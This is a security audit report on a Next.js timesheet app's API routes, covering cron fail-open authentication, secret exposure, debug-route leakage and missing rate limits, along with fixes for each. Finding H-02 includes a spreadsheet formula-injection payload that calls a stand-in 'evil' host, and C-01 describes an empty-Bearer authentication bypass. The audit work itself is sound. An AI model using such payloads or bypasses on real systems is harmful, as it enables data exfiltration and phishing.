# Full Production API Security Audit

**Repository:** shopstack-asia/shopstack-timesheet  
**Scope:** All externally reachable server entry points (App Router API routes, middleware, NextAuth, Slack webhooks, cron, debug)  
**Mode:** Read-only static code-path analysis  
**Date:** 2026-07-18  
**Code revision audited:** branch `mcp` (post hardening of Slack pending-write path)

---

## 1. Overall Score

```text
54 / 100
```

Scoring notes (evidence-based):

- Strong patterns on session-bound employee scoping for timesheet/leave reads and Slack identity bridge (+).
- Slack HMAC + 5-minute replay window (+).
- Critical fail-open cron secret and `NEXTAUTH_SECRET` client exposure (−−).
- Multiple High issues: Sheets `USER_ENTERED` formula injection, web business-rule bypass, debug data leakage, missing rate limits (−).

---

## 2. Production Readiness

```text
NO
```

Critical and High findings remain unresolved. Per audit rules, the system is **not** production-ready until those are fixed.

---

## 3. Executive Summary

This application exposes **18 App Router route modules** (plus NextAuth catch-all), with no Pages Router APIs, no Server Actions, no GraphQL, and no WebSocket handlers found.

**Strengths verified in code:**

- Browser timesheet/leave/master routes require NextAuth session and derive `EmployeeID` from `session.staffProfile` (not from client-supplied staff IDs).
- Slack events/interactions verify HMAC signatures on the raw body before processing; empty signing secret fails closed.
- Slack identity resolves Slack user → email → `@shopstack.asia` → Zoho employee; agent writes bind to that employee.
- Pending Slack writes use atomic claim + fingerprint stale checks (agent path).
- Sheets Time Log writes use a Redis write lock.

**Blockers:**

1. **Cron auth fails open** when `CRON_SECRET` is empty (`Authorization: Bearer ` matches).
2. **`NEXTAUTH_SECRET` is injected via `next.config.js` `env`**, which can embed the secret into the client JavaScript bundle.
3. **Google Sheets writes use `USER_ENTERED`**, enabling spreadsheet formula injection from user-controlled strings (custom project names / fields).
4. **Web `POST /api/timesheet/submit` does not enforce** leave, holiday, future-date, or day-total > 24 rules that exist only in the Slack agent / UI.
5. **Debug routes** (even when gated) return stacks, Zoho response bodies, and can send arbitrary email/Slack content when `CRON_SECRET` is known.
6. **No application-level rate limiting** on any endpoint; Sheets/Zoho/Slack/SMTP abuse and cost exhaustion are possible.

---

## 4. Complete Public Endpoint Inventory

| Method | Route | File | Handler | Purpose | Caller | Exposure | Authentication | Authorization | Input | Data Access | Side Effects | Rate Limit | Idempotency | Risk |
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
| GET, POST | `/api/auth/*` | `src/app/api/auth/[...nextauth]/route.ts` | NextAuth `handler` | Google OAuth sign-in, session, callbacks | Browser | Public OAuth | Google OAuth + NextAuth JWT | `@shopstack.asia` + Zoho employee required in `signIn` | OAuth query/body | Zoho People, JWT cookie | Session create | Absent | N/A (OAuth) | High |
| GET | `/api/timesheet/get` | `src/app/api/timesheet/get/route.ts` | `GET` | Load week Time Log for session employee | Browser | Authenticated | NextAuth session (+ middleware) | Own `EmployeeID` only | Query `weekStart` | Sheets | Read | Absent | Read-safe | Medium |
| POST | `/api/timesheet/submit` | `src/app/api/timesheet/submit/route.ts` | `POST` | Replace day Time Log for session employee | Browser | Authenticated | NextAuth session (+ middleware) | Own `EmployeeID`; may `createProject` | JSON body | Sheets, Redis lock | Write/delete | Absent | Lock + upsert-then-delete | Critical* |
| GET | `/api/timesheet/holidays` | `src/app/api/timesheet/holidays/route.ts` | `GET` | Holidays from Redis cache | Browser | Authenticated | NextAuth session | Location from session | Query `year` | Redis | Read | Absent | Read-safe | Low |
| GET | `/api/master/projects` | `src/app/api/master/projects/route.ts` | `GET` | All projects + clients | Browser | Authenticated | NextAuth session | Any authenticated employee (global master) | None | Sheets/Redis cache | Read | Absent | Read-safe | Medium |
| GET | `/api/master/tasks` | `src/app/api/master/tasks/route.ts` | `GET` | All tasks | Browser | Authenticated | NextAuth session | Any authenticated employee | None | Sheets/Redis cache | Read | Absent | Read-safe | Medium |
| GET | `/api/staff/profile` | `src/app/api/staff/profile/route.ts` | `GET` | Return session staff profile | Browser | Authenticated | NextAuth session | Own profile only | None | Session JWT | Read | Absent | Read-safe | Low |
| GET | `/api/staff/leave` | `src/app/api/staff/leave/route.ts` | `GET` | Leave range for session employee | Browser | Authenticated | NextAuth session | Own `EmployeeID` | Query `from`,`to` | Zoho, Redis | Read | Absent | Cache key per range | Medium |
| GET | `/api/staff/leave/monthly` | `src/app/api/staff/leave/monthly/route.ts` | `GET` | Monthly leave | Browser | Authenticated | NextAuth session | Own `EmployeeID` | Query `year`,`month` | Zoho, Redis | Read | Absent | Cache | Low |
| GET | `/api/staff/leave/yearly` | `src/app/api/staff/leave/yearly/route.ts` | `GET` | Yearly leave | Browser | Authenticated | NextAuth session | Own `EmployeeID` | Query `year` | Zoho, Redis | Read | Absent | Cache | Low |
| POST | `/api/slack/events` | `src/app/api/slack/events/route.ts` | `POST` | Slack Events API | Slack | Webhook | Slack signing secret HMAC | Identity via Slack→Zoho | Raw JSON body | Redis, Sheets, Zoho, Slack, AI | Write via agent | Absent | `event_id` dedupe | High |
| POST | `/api/slack/interactions` | `src/app/api/slack/interactions/route.ts` | `POST` | Slack interactivity | Slack | Webhook | Slack signing secret HMAC | Identity via Slack→Zoho | Form `payload` | Redis, Sheets, Zoho, Slack | Write via agent | Absent | Claim only (no event dedupe) | High |
| POST, GET | `/api/cron/friday-reminder` | `src/app/api/cron/friday-reminder/route.ts` | `POST`/`GET` | Email + Slack reminders; holiday refresh | Vercel cron / operator | Internal secret | `Authorization: Bearer ${CRON_SECRET}` | Secret holder | Headers; Host for URL | Zoho, SMTP, Slack, Redis | Mass email/Slack | Absent | Not idempotent | Critical |
| POST, GET | `/api/cron/refresh-holidays` | `src/app/api/cron/refresh-holidays/route.ts` | `POST`/`GET` | Refresh holiday cache | Operator/cron | Internal secret | Bearer `CRON_SECRET` | Secret holder | Headers | Zoho, Redis | Cache write | Absent | Re-run safe-ish | Critical |
| POST, GET | `/api/debug/email-test` | `src/app/api/debug/email-test/route.ts` | `POST`/`GET` | Send arbitrary test email | Operator | Debug | `assertDebugAccess` | Secret / non-prod | JSON/query | SMTP | Send email | Absent | None | Critical |
| POST, GET | `/api/debug/slack-test` | `src/app/api/debug/slack-test/route.ts` | `POST`/`GET` | Post test Slack messages | Operator | Debug | `assertDebugAccess` | Secret / non-prod | JSON optional | Slack | Post channel msg | Absent | None | High |
| GET | `/api/debug/zoho-test` | `src/app/api/debug/zoho-test/route.ts` | `GET` | Lookup Zoho employee by email | Operator | Debug | `assertDebugAccess` | Secret / non-prod | Query `email` | Zoho | Read + leak details | Absent | Read | High |
| GET | `/api/debug/zoho-token-test` | `src/app/api/debug/zoho-token-test/route.ts` | `GET` | Refresh Zoho OAuth token | Operator | Debug | `assertDebugAccess` | Secret / non-prod | None | Zoho Accounts | Token refresh | Absent | Side-effecting | High |
| GET | `/` | `src/app/page.tsx` | page | Redirect sign-in or timesheet | Browser | Public page | Session check | N/A | N/A | Session | Redirect | Absent | N/A | Low |
| GET | `/timesheet` | `src/app/timesheet/page.tsx` | page | Timesheet UI | Browser | Authenticated (middleware) | NextAuth middleware | Session | N/A | Client→API | UI | Absent | N/A | Medium |
| GET | `/auth/signin`, `/auth/error` | `src/app/auth/*/page.tsx` | pages | Auth UI | Browser | Public | N/A | N/A | N/A | N/A | UI | Absent | N/A | Low |

\*Risk elevated by business-rule bypass and Sheets formula mode, not by missing session auth.

**Not found (searched):** Pages Router `/pages/api`, Server Actions (`"use server"`), GraphQL, WebSocket, file upload/download/export routes, RPC, health/metrics endpoints, rewrites/proxies in `next.config.js`.

**Middleware matcher:** `/timesheet/:path*`, `/api/timesheet/:path*`, `/api/master/:path*`, `/api/staff/:path*` — does **not** cover `/api/slack`, `/api/cron`, `/api/debug`, `/api/auth` (those use dedicated auth).

**Vercel:** `vercel.json` schedules GET/POST path `/api/cron/friday-reminder` Fridays.

---

## 5. Authentication Findings

### PASS (with evidence)

**Endpoint:** `POST /api/slack/events`  
**File:** `src/app/api/slack/events/route.ts` L9–17  
**Handler:** `POST`  
**Authentication:** Slack HMAC via `verifySlackSignature()` on raw body **before** JSON parse.  
**Replay Protection:** 5-minute timestamp window in `src/lib/slack/client.ts` L28–30.  
**Empty secret:** `verifySlackSignature` returns `false` if `!signingSecret` (L23–24).  
**Status:** PASS  
**Evidence:** Signature check precedes `JSON.parse` and `processSlackEvent`.

**Endpoint:** `POST /api/slack/interactions`  
**File:** `src/app/api/slack/interactions/route.ts` L9–17  
**Status:** PASS (same signature verification pattern on raw body).

**Endpoint:** Session APIs under `/api/timesheet/*`, `/api/master/*`, `/api/staff/*`  
**Evidence:** Each handler calls `getServerSession(authOptions)` and returns 401 without session; middleware also matches these paths (`src/middleware.ts` L1–4). Staff identity comes from JWT `staffProfile`, not request body.

**Endpoint:** NextAuth `signIn`  
**File:** `src/lib/auth.ts` L15–59  
**Evidence:** Requires email ending `@shopstack.asia` and Zoho `getEmployeeByEmail`; otherwise returns `false`.

### FAIL

See Critical C-01 (empty `CRON_SECRET`), C-02 (`NEXTAUTH_SECRET` in `next.config.js` `env`), High H-04 (debug token probe), H-05 (debug Zoho probe leakage).

**Cron comparison is not timing-safe:** `authHeader !== \`Bearer ${CRON_SECRET}\`` (`friday-reminder/route.ts` L36, `refresh-holidays/route.ts` L14). Slack HMAC uses `crypto.timingSafeEqual` (`client.ts` L36).

---

## 6. Authorization Findings

### PASS — horizontal IDOR on timesheet/leave (session path)

**Endpoint:** `GET /api/timesheet/get`  
**Evidence:** `getWeeklyTimesheetForStaff` filters `entry['Staff ID'] === ctx.staff.EmployeeID` (`timesheet-service.ts` L28–30). Client cannot pass another staff ID.

**Endpoint:** `POST /api/timesheet/submit`  
**Evidence:** Rows written with `'Staff ID': ctx.staff.EmployeeID` from session (`timesheet-service.ts` ~L210). No staffId in request schema (`submit/route.ts` L11–20).

**Endpoint:** Leave APIs  
**Evidence:** `employeeId = session.staffProfile.EmployeeID` only (`leave/route.ts` L43–72). Query params are dates/year/month, not employee IDs.

**Endpoint:** Slack agent  
**Evidence:** `resolveSlackIdentity(slackUserId)` from Slack event user (`identity.ts`); pending writes store `slackUserId` and `claimPendingWrite` rejects `WRONG_USER` (`conversation-state.ts`).

### FAIL / gaps

- **No role model:** Any authenticated `@shopstack.asia` Zoho employee can read **global** project/task master lists and write **own** timesheet including **creating custom projects** (`allowCustomProject: true` on web submit L51).
- **Web path does not enforce leave/holiday/future/over-24** (those rules live in Slack `evaluateWriteGuards` / UI only) — see H-01.
- **Debug email** can send to **any** recipient once `CRON_SECRET` is known — vertical “operator” capability without separate admin role.

---

## 7. Input Validation Findings

| Area | Status | Evidence |
|---|---|---|
| Submit JSON schema | Partial PASS | Zod date + entries; hours `min(0).max(24)` per entry (`submit/route.ts` L11–20). **Day total unbounded.** Hours `0` allowed. |
| weekStart | Partial | Required; regex only inside service (`timesheet-service.ts` L14–16). |
| Leave `from`/`to` | Weak | Passed to Zoho/Redis key with **no format Zod** (`leave/route.ts` L47–52) — cache-key spam / Zoho abuse. |
| Holiday year | PASS | `NaN` / `<2000` rejected (`holidays/route.ts` L44–52). |
| Slack body | PASS | Signature first; JSON parse errors → 400. |
| Debug email `to`/`message` | FAIL | Arbitrary address + HTML (`email-test/route.ts` L30–33, L71–76) — HTML injection into email. |
| Custom project name | FAIL | User string becomes Sheets cell with `USER_ENTERED` — formula injection (H-02). |
| Prototype pollution | Low risk | Zod object schemas strip unknown for submit; debug uses loose `body.to`. |

---

## 8. Webhook Findings

### Slack Events — mostly PASS

| Control | Status | Evidence |
|---|---|---|
| Signature | PASS | `events/route.ts` L15–17 |
| Raw body | PASS | `request.text()` L10 |
| Timestamp / replay window | PASS | `client.ts` L28–30 |
| Dedup | PASS | `event_id` → `wasEventProcessed` (`event-handler.ts` L37–40; TTL 24h in `conversation-state.ts`) |
| Fast ack | PASS | `waitUntil` + immediate `{ ok: true }` L38–43 |
| Identity | PASS | Slack→Zoho, domain check |

### Slack Interactions — PASS auth, FAIL dedupe

| Control | Status | Evidence |
|---|---|---|
| Signature | PASS | `interactions/route.ts` L15–17 |
| Event dedupe | FAIL | No `wasEventProcessed` / interaction payload id (`event-handler.ts` `processSlackInteraction` L86–127). Relies on pending claim for writes. |
| Button → YES/CANCEL | PASS | Maps `timesheet_confirm` → `YES` L105–108 |

### OAuth / Google

- NextAuth Google provider; state handled by NextAuth (library). Empty `GOOGLE_CLIENT_ID`/`SECRET` default to `''` (`auth.ts` L9–10) — misconfiguration breaks login rather than opening auth, but is fragile.

---

## 9. CSRF and CORS Findings

- **No CORS middleware** found in repo (no `Access-Control-Allow-Origin` configuration). Same-origin browser fetches from `/timesheet` are the intended model.
- **No explicit CSRF tokens** on `POST /api/timesheet/submit`.
- NextAuth JWT session cookies: NextAuth v4 defaults typically `SameSite=Lax`, which blocks most cross-site credentialed POSTs in modern browsers — **mitigation by cookie policy, not application CSRF tokens**.
- **Status:** Medium residual CSRF risk on older clients / misconfigured cookie overrides; not verified as hardened in this codebase (no explicit cookie options in `auth.ts`).
- Slack webhooks: CSRF N/A (signature-based, not cookie session).
- Cron/debug: CSRF N/A if secret not in browser; if secret leaks, browser CSRF irrelevant vs direct Bearer use.

---

## 10. Rate Limiting and Abuse Findings

**Absent on every endpoint** (no rate-limit middleware, Redis counters, or Vercel WAF config in-repo).

High-abuse targets:

| Endpoint | Abuse mode |
|---|---|
| `POST /api/timesheet/submit` | Sheets quota + lock contention |
| `GET /api/staff/leave*` | Zoho API + Redis key cardinality via arbitrary date ranges |
| `POST /api/slack/events` | After valid signature, AI/Zoho/Sheets cost (Slack retries mitigated by dedupe) |
| `POST /api/cron/friday-reminder` | Mass email/Slack to all employees |
| `POST /api/debug/email-test` | SMTP relay spam |
| `GET /api/debug/zoho-token-test` | Refresh-token churn |

---

## 11. Idempotency and Race Condition Findings

| Path | Status | Evidence |
|---|---|---|
| Slack pending confirm | PASS (agent) | `claimPendingWrite` SET NX + orphan reclaim (`conversation-state.ts`) |
| Slack event retry | PASS | `event_id` dedupe before side effects |
| Slack interaction retry | PARTIAL | No dedupe; claim reduces double-write |
| Web submit concurrent | PARTIAL | Global `withTimeLogWriteLock` serializes Time Log mutations; duplicate POSTs can still rewrite same day |
| Upsert-then-delete | PASS intent | `timesheet-service.ts` upsert before delete + snapshot restore |
| Friday reminder | FAIL | Re-running sends duplicate emails/Slack |

---

## 12. Data Leakage and Privacy Findings

| Finding | Severity | Evidence |
|---|---|---|
| Zoho debug returns `stack` and `error.response.data` | High | `zoho-test/route.ts` L50–74 |
| Zoho token test returns token preview + full error `response.data` | High | `zoho-token-test/route.ts` L50–79 |
| Email errors include `SMTP_HOST` / port | Medium | `email-test/route.ts` L105–106 |
| Holiday API logs holiday payloads | Low | `holidays/route.ts` L59–61 |
| `NEXTAUTH_SECRET` potentially in client bundle | Critical | `next.config.js` L4–7 |
| Master projects/tasks expose full org lists to any employee | Medium (by design) | `projects/route.ts`, `tasks/route.ts` |

Secrets in responses: no Slack/Google private keys returned in normal timesheet APIs (verified). Debug token preview returns first 20 chars of access token — still sensitive.

---

## 13. Secret and Configuration Findings

| Item | Status | Evidence |
|---|---|---|
| Slack signing empty → reject | PASS | `client.ts` L23–24 |
| Cron empty secret → accept `Bearer ` | **FAIL Critical** | `CRON_SECRET \|\| ''` then equality (`friday-reminder/route.ts` L11, L36) |
| Debug prod without secret | PASS closed | `debug-auth.ts` L15–21 requires non-prod OR Bearer secret |
| Debug with empty secret in prod | PASS | `if (secret && auth === ...)` skips empty; then 401 |
| `NEXTAUTH_SECRET` in `next.config.js` `env` | **FAIL Critical** | `next.config.js` L4–7 |
| `NEXT_PUBLIC_*` | PASS for secrets | Only app URL / location defaults in `.env.example` |
| Hardcoded secrets | PASS | None found in source (placeholders only) |
| Google Sheets missing spreadsheet ID | Fail closed | throws in constructor (`google-sheets.ts` L27–32) |

---

## 14. Middleware and Route Protection Findings

**File:** `src/middleware.ts`

```text
export { default } from 'next-auth/middleware';
matcher: ['/timesheet/:path*', '/api/timesheet/:path*', '/api/master/:path*', '/api/staff/:path*']
```

| Path class | Middleware | Handler auth |
|---|---|---|
| Timesheet/master/staff API | Yes | Yes (`getServerSession`) |
| Slack | No | Signature |
| Cron | No | Bearer secret (fail-open if empty) |
| Debug | No | `assertDebugAccess` |
| Auth | No | NextAuth |

**Direct API calls** to matched routes remain protected by session checks even if middleware were bypassed — defense in depth present for those routes.

**Risk:** Operators may assume middleware covers all `/api/*`; it does not.

---

## 15. Business Logic Security Findings

| Rule | Slack agent | Web API | Enforced in Sheets service? |
|---|---|---|---|
| Hours > 0 | Yes (guardrails) | No (`min(0)`) | No |
| Per-entry ≤ 24 | Yes | Yes (Zod) | Yes (Zod) |
| Day total ≤ 24 | Soft ack | **No** | No |
| Full leave block / OVERRIDE | Yes | **No** | No |
| Holiday ack | Yes | **No** | No |
| Future date ack | Yes | **No** | No |
| Custom project create | Disabled | **Allowed** | Creates via `createProject` |
| Confirmation YES/CLEAR | Yes | N/A (immediate write) | N/A |
| Own employee only | Yes | Yes | Yes |

**Conclusion:** Server engine for web submit does **not** enforce the same business rules as the Slack agent. UI checks are bypassable with a crafted authenticated POST.

---

## 16. Critical Findings

### C-01 — Cron authentication fails open when `CRON_SECRET` is empty

- **Severity:** Critical  
- **Endpoint:** `POST|GET /api/cron/friday-reminder`, `POST|GET /api/cron/refresh-holidays`  
- **File:** `src/app/api/cron/friday-reminder/route.ts` L11–44; `src/app/api/cron/refresh-holidays/route.ts` L8–22  
- **Function:** `POST`  
- **Description:** `CRON_SECRET` defaults to `''`. Check is `authHeader !== \`Bearer ${CRON_SECRET}\``. Request header `Authorization: Bearer ` (empty token) authorizes the caller.  
- **Attack scenario:** Unauthenticated attacker triggers Friday reminder → emails all employees and posts `<!channel>` Slack messages; or refreshes/overwrites holiday cache.  
- **Impact:** Mass phishing vector via org SMTP/Slack; operational disruption.  
- **Evidence:** L11 `const CRON_SECRET = process.env.CRON_SECRET || ''`; L36 equality check; GET aliases POST (L142–144 / L43–45).  
- **Required remediation:** Fail closed if secret missing/short; reject empty Bearer; use timing-safe compare; prefer POST-only for cron.

### C-02 — `NEXTAUTH_SECRET` exposed through Next.js `env` config

- **Severity:** Critical  
- **Endpoint:** All NextAuth/session consumers (global config)  
- **File:** `next.config.js` L4–7  
- **Function:** Next config `env`  
- **Description:** `env: { NEXTAUTH_SECRET: process.env.NEXTAUTH_SECRET }` instructs Next.js to inline this value into the application environment available to bundled code, which can leak the JWT signing secret to clients.  
- **Attack scenario:** Attacker extracts secret from client bundle → forges session JWTs → impersonates any employee.  
- **Impact:** Full account takeover of all users.  
- **Evidence:** `next.config.js` lines 4–7 include `NEXTAUTH_SECRET`.  
- **Required remediation:** Remove `NEXTAUTH_SECRET` (and any secrets) from `next.config.js` `env`; keep server-only env vars unset in that map; rotate secret after fix.

### C-03 — Authenticated open email relay via debug endpoint (when secret known or non-prod)

- **Severity:** Critical (in production if `CRON_SECRET` compromised; High if only non-prod)  
- **Endpoint:** `POST|GET /api/debug/email-test`  
- **File:** `src/app/api/debug/email-test/route.ts` L8–76, L126–183  
- **Function:** `POST` / `GET`  
- **Description:** After `assertDebugAccess`, accepts arbitrary `to`, `subject`, and HTML `message` and sends via org SMTP. GET allows `?to=`.  
- **Attack scenario:** Stolen `CRON_SECRET` → spam/phishing as Shopstack.  
- **Impact:** Brand damage, credential phishing.  
- **Evidence:** L30–33 parse body; L71–76 `sendMail` with `html: emailMessage`.  
- **Required remediation:** Disable in production entirely, or restrict recipients to `@shopstack.asia` and fixed templates; remove arbitrary HTML; POST-only.

---

## 17. High Findings

### H-01 — Web timesheet submit bypasses leave/holiday/future/day-total rules

- **Severity:** High  
- **Endpoint:** `POST /api/timesheet/submit`  
- **File:** `src/app/api/timesheet/submit/route.ts`; contrast `src/lib/timesheet-agent/guardrails.ts`  
- **Function:** `POST` → `submitDayTimesheetForStaff`  
- **Description:** Server accepts any Zod-valid day replace. Leave OVERRIDE, holiday, future, over-24 exist only in Slack/UI layers.  
- **Attack scenario:** Authenticated user POSTs hours on full-leave days or >24h totals.  
- **Impact:** Policy bypass; inaccurate HR/time data.  
- **Evidence:** Submit schema L11–20; no call to `evaluateWriteGuards`; `allowCustomProject: true` L51.  
- **Required remediation:** Enforce shared server-side guardrails in `submitDayTimesheetForStaff` or submit route for all sources.

### H-02 — Google Sheets `USER_ENTERED` enables formula injection

- **Severity:** High  
- **Endpoint:** `POST /api/timesheet/submit` (and any Sheets append/update path)  
- **File:** `src/lib/google-sheets.ts` L164, L316, L400  
- **Function:** `createProject`, update/append helpers  
- **Description:** Values written with `valueInputOption: 'USER_ENTERED'`. Custom project names (`createProject(projectName)`) and other fields may be interpreted as formulas (`=...`, `+...`).  
- **Attack scenario:** Submit unknown `projectId` string `=HYPERLINK("https://evil"&...)` → stored as formula in Projects/Time Log.  
- **Impact:** Spreadsheet compromise, data exfiltration to viewers with Sheets access.  
- **Evidence:** `createProject` L139–164; `USER_ENTERED` at L164/316/400.  
- **Required remediation:** Use `RAW` input option; sanitize leading `=`, `+`, `-`, `@`.

### H-03 — No rate limiting on expensive / destructive endpoints

- **Severity:** High  
- **Endpoint:** All APIs (especially submit, leave, slack, cron, debug)  
- **File:** N/A (absence); handlers as listed in inventory  
- **Description:** No IP/user/token rate limits in application code or in-repo edge config.  
- **Attack scenario:** Authenticated flood of submit/leave; or signed Slack flood; or cron secret abuse.  
- **Impact:** Zoho/Sheets/Slack quota exhaustion, Redis growth, cost, DoS.  
- **Required remediation:** Add rate limits (edge or Redis) per user/IP; stricter limits on cron/debug.

### H-04 — Debug Zoho token endpoint refreshes OAuth and returns token material

- **Severity:** High  
- **Endpoint:** `GET /api/debug/zoho-token-test`  
- **File:** `src/app/api/debug/zoho-token-test/route.ts` L7–60  
- **Function:** `GET`  
- **Description:** Performs live token refresh; returns `tokenPreview`, scope, api domain; errors include upstream `response.data`.  
- **Attack scenario:** Bearer secret holder (or non-prod open access) probes and harvests token metadata / error bodies.  
- **Impact:** Credential intelligence; unnecessary token churn.  
- **Evidence:** L29–40 axios to Zoho accounts; L50–59 success payload.  
- **Required remediation:** Remove from production builds or gate behind stronger admin + no token fragments in responses.

### H-05 — Debug Zoho employee lookup returns stacks and upstream payloads

- **Severity:** High  
- **Endpoint:** `GET /api/debug/zoho-test`  
- **File:** `src/app/api/debug/zoho-test/route.ts` L44–75  
- **Function:** `GET`  
- **Description:** Error path returns `stack` and `error.response.data` to client.  
- **Attack scenario:** Trigger errors to map Zoho API internals.  
- **Impact:** Information disclosure.  
- **Evidence:** L50–74 `details: errorDetails` including stack/response.  
- **Required remediation:** Generic client errors; log details server-side only; disable in production.

### H-06 — Debug Slack test posts attacker-controlled message to production channels

- **Severity:** High  
- **Endpoint:** `POST /api/debug/slack-test`  
- **File:** `src/app/api/debug/slack-test/route.ts` L61–68, L77–78  
- **Function:** `POST`  
- **Description:** Optional `body.message` posted with `<!channel>` capability in default template; custom message fully controlled.  
- **Attack scenario:** Compromised `CRON_SECRET` → spam all reminder channels.  
- **Impact:** Org-wide Slack disruption.  
- **Evidence:** L65 `customMessage = body.message`; L77–78 uses custom or default with `<!channel>`.  
- **Required remediation:** Fixed template only; disable in production.

### H-07 — Host header influence on reminder links (post-auth)

- **Severity:** High (requires cron auth)  
- **Endpoint:** `/api/cron/friday-reminder`  
- **File:** `src/app/api/cron/friday-reminder/route.ts` L14–29, L75–86  
- **Function:** `getTimesheetUrl`  
- **Description:** If env app URL unset, uses `x-forwarded-proto` + `host` / `x-forwarded-host` to build email/Slack links.  
- **Attack scenario:** With cron auth, attacker sets Host to phishing domain → employees receive trusted-looking reminder linking to attacker.  
- **Impact:** Credential phishing at scale.  
- **Evidence:** L22–26 host fallback; L75–86 embeds `timesheetUrl` in email.  
- **Required remediation:** Require `NEXT_PUBLIC_APP_URL`/`APP_URL`; never trust Host for outbound links.

---

## 18. Medium Findings

### M-01 — Slack interactions lack event deduplication

- **Endpoint:** `POST /api/slack/interactions`  
- **File:** `src/lib/slack/event-handler.ts` L86–127  
- **Evidence:** No `wasEventProcessed`; relies on pending claim.  
- **Impact:** Duplicate non-write side effects / race windows.  
- **Remediation:** Dedupe on interaction `payload` id / action timestamp.

### M-02 — CSRF relies solely on cookie SameSite (not configured in repo)

- **Endpoint:** `POST /api/timesheet/submit`  
- **File:** `src/lib/auth.ts` (no cookie options); `WeeklyTimesheet.tsx` L438 fetch without CSRF token  
- **Impact:** Residual cross-site risk if cookies ever `SameSite=None` or old browsers.  
- **Remediation:** Explicit cookie `sameSite: 'lax'|'strict'`; Origin check or CSRF token on mutating APIs.

### M-03 — Leave range parameters weakly validated

- **Endpoint:** `GET /api/staff/leave`  
- **File:** `src/app/api/staff/leave/route.ts` L47–52  
- **Impact:** Redis key explosion / Zoho load.  
- **Remediation:** Zod date validation + max range.

### M-04 — GET aliases for state-changing cron/debug

- **Endpoints:** cron + debug email/slack  
- **Evidence:** `GET` → `POST` or full send path.  
- **Impact:** Easier triggering via prefetch/logs; cache intermediaries.  
- **Remediation:** POST-only for side effects.

### M-05 — Global master data readable by all employees

- **Endpoints:** `/api/master/projects`, `/api/master/tasks`  
- **Impact:** Information disclosure of all clients/projects (may be intended).  
- **Remediation:** Confirm business acceptance or filter by assignment.

### M-06 — Non-timing-safe cron secret compare

- **File:** cron routes L14/L36  
- **Impact:** Theoretical timing leak of secret.  
- **Remediation:** `crypto.timingSafeEqual` on hashed/padded secrets.

### M-07 — Web submit allows `hours: 0` and unbounded day totals

- **File:** `submit/route.ts` L17  
- **Impact:** Nonsense or policy-violating data.  
- **Remediation:** Align with agent (`hours > 0`, day total policy).

### M-08 — Friday reminder not idempotent

- **File:** `friday-reminder/route.ts`  
- **Impact:** Duplicate spam on retries.  
- **Remediation:** Daily Redis idempotency key.

---

## 19. Low Findings

### L-01 — Middleware matcher documentation drift

- Operators may assume all `/api/*` protected by NextAuth middleware.  
- **Evidence:** `middleware.ts` matcher omits slack/cron/debug/auth.

### L-02 — Holiday API console logs data

- **File:** `holidays/route.ts` L59–61  

### L-03 — Slack `url_verification` echoes challenge after signature

- Expected Slack behavior; signature required — OK, residual note only.

### L-04 — `npm audit` dependency vulnerabilities (supply chain)

- Observed during validation runs; not API-route logic but production risk.

### L-05 — Error messages from submit may echo internal validation strings

- **File:** `submit/route.ts` L72–80 returns `error.message` to client (usually safe Zod/business strings).

---

## 20. Endpoints Confirmed Secure

*(“Secure” = authn/authz for primary threat model verified end-to-end in code; does **not** mean free of Medium/Low issues above.)*

| Endpoint | Why confirmed |
|---|---|
| `GET /api/timesheet/get` | Session required; staff filter in service; no client staffId |
| `GET /api/staff/profile` | Returns only session profile |
| `GET /api/staff/leave/monthly` | Session EmployeeID; year/month validated |
| `GET /api/staff/leave/yearly` | Session EmployeeID; year validated |
| `GET /api/timesheet/holidays` | Session required; year validated |
| `POST /api/slack/events` | HMAC + replay window + fail-closed empty secret + event_id dedupe + identity bridge |
| `POST /api/slack/interactions` | HMAC + identity bridge + confirm keywords for writes (dedupe gap → not fully “abuse-proof”) |

**Not listed here:** submit (business bypass + formula injection), cron (fail-open secret), all debug routes, master lists (global read by design).

---

## 21. Endpoints Not Fully Verifiable

| Item | Missing for full verification |
|---|---|
| NextAuth cookie flags in production | No explicit `cookies` config in `auth.ts`; actual Vercel/NextAuth runtime defaults not visible in repo |
| Vercel WAF / platform rate limits | Not in repository |
| Whether production `CRON_SECRET` / `NEXTAUTH_SECRET` are set | Env not audited (runtime); code paths fail open / leak regardless |
| Google OAuth token storage hardening | Delegated to NextAuth/Google |
| Physical Sheets ACL / sharing | Outside app code |
| AI provider prompt-injection → unintended tool use | Model layer present; destructive path keyword-gated for Slack writes, but intent routing still LLM-assisted |

---

## 22. Prioritized Remediation Plan

### 1. Critical (must fix before production)

1. **C-01** — Fail closed on missing/empty `CRON_SECRET`; timing-safe compare; disable GET for cron side effects.  
2. **C-02** — Remove `NEXTAUTH_SECRET` from `next.config.js` `env`; rotate secret.  
3. **C-03** — Disable or strictly lock down `/api/debug/email-test` in production (no arbitrary HTML/recipients).

### 2. High

4. **H-02** — Sheets `RAW` + sanitize formula-leading characters.  
5. **H-01** — Shared server-side business guardrails on web submit.  
6. **H-03** — Rate limiting on submit, leave, slack, cron, debug.  
7. **H-04/H-05/H-06** — Remove or heavily restrict debug routes in production; no stacks/token previews.  
8. **H-07** — Mandatory configured app base URL for outbound links.

### 3. Medium

9. Interaction dedupe (M-01), CSRF hardening (M-02), leave validation (M-03), POST-only mutations (M-04), cron compare (M-06), hours/total policy (M-07), reminder idempotency (M-08).

### 4. Low

10. Docs for middleware coverage (L-01), reduce logging (L-02), dependency audit (L-04).

---

## 23. Final Verdict

```text
❌ Not Production Ready
```

**Rationale:** Critical findings **C-01** (cron fail-open) and **C-02** (`NEXTAUTH_SECRET` client exposure path) alone are production blockers. Multiple High findings (Sheets formula injection, web business-rule bypass, debug leakage, no rate limits) remain. Slack write hardening and session-scoped employee isolation are real strengths but do not outweigh these issues.

---

## Appendix A — Discovery checklist (completed)

- [x] Enumerated all `src/app/api/**/route.ts` (18 modules)  
- [x] Inspected each route handler and call chain into `src/lib/**`  
- [x] Inspected `src/middleware.ts`, `next.config.js`, `vercel.json`  
- [x] Inspected auth (`src/lib/auth.ts`), debug auth, Slack signature, agent auth  
- [x] Inspected Redis usage (locks, pending, leave cache, event dedupe)  
- [x] Inspected Google Sheets writes (`USER_ENTERED`, createProject, submit order)  
- [x] Inspected Slack events/interactions/identity/agent  
- [x] Inspected env usage patterns and `NEXT_PUBLIC_*`  
- [x] Inspected destructive operations (submit, clear, cron email/slack, debug send)  
- [x] Confirmed no Pages API, Server Actions, GraphQL, upload/download routes  
- [x] Identified missing rate limiting and idempotency gaps  
- [x] No code/config modified except this report file  

---

## Appendix B — Attack simulation (static)

| Attack | Primary target | Code-path result |
|---|---|---|
